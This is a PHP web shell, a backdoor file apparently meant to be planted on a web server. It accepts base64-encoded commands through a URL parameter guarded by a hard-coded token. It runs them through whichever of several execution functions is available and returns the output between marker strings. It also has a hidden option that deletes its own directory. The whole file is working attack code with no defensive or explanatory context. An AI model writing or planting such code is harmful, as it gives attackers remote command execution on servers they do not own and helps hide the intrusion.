<?php
if (!hash_equals('7754359aa07c4691fb5831cf202a5654', (string)($_GET['t'] ?? ''))) { http_response_code(404); exit; }
if (isset($_GET['rm'])) { $d = __DIR__; foreach (glob($d . '/*') as $f) { @unlink($f); } @rmdir($d); echo 'W2S::REMOVED::END'; exit; }
function w2sd_run($c) {
    $c = base64_decode($c) . ' 2>&1';
    if (function_exists('shell_exec')) { return shell_exec($c); }
    if (function_exists('exec')) { exec($c, $o); return implode("\n", $o); }
    if (function_exists('system')) { ob_start(); system($c); return ob_get_clean(); }
    if (function_exists('passthru')) { ob_start(); passthru($c); return ob_get_clean(); }
    if (function_exists('proc_open')) { $p = proc_open($c, array(1 => array('pipe', 'w')), $pipes); if (is_resource($p)) { $o = stream_get_contents($pipes[1]); proc_close($p); return $o; } }
    return 'W2S_NO_EXEC';
}
echo 'W2S::' . w2sd_run((string)($_GET['c'] ?? '')) . '::END';
